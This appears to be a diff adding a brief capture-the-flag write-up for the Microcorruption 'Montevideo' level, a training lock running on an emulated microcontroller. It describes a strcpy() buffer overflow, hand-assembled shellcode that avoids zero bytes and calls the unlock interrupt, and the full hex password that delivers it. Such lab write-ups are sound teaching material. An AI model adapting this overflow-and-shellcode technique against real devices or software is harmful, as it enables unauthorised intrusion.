@@ -1,0 +1,11 @@
+Montevideo
+strcpy() again. There's no unlock_door() function. This time the password checking and unlocking is handled by the HSM. However we can look in the manual (https://microcorruption.com/manual.pdf) and write the unlocking code ourselves. Calling interrupt 0x7f will do the trick. Our original input is copied using strcpy() to a new location on 4400 and the original address is zeroed after that. This means we can't use a zero byte in the password, so this complicates situation a bit. We can't just use mov 0x7f00 to r15.
+So I borrowed the code from the actual executable:
+0244 // address of the shellcode
+0101 // value to be popped in r4
+3441           pop  r4
+3f40 7eff      mov  #0xff7e, r15
+0f54           add  r4, r15
+0f12           push r15
+b012 4c45      call #0x454c <INT>
+Password: 616161616161616161616161616161610244010134413f407eff0f540f12b0124c45
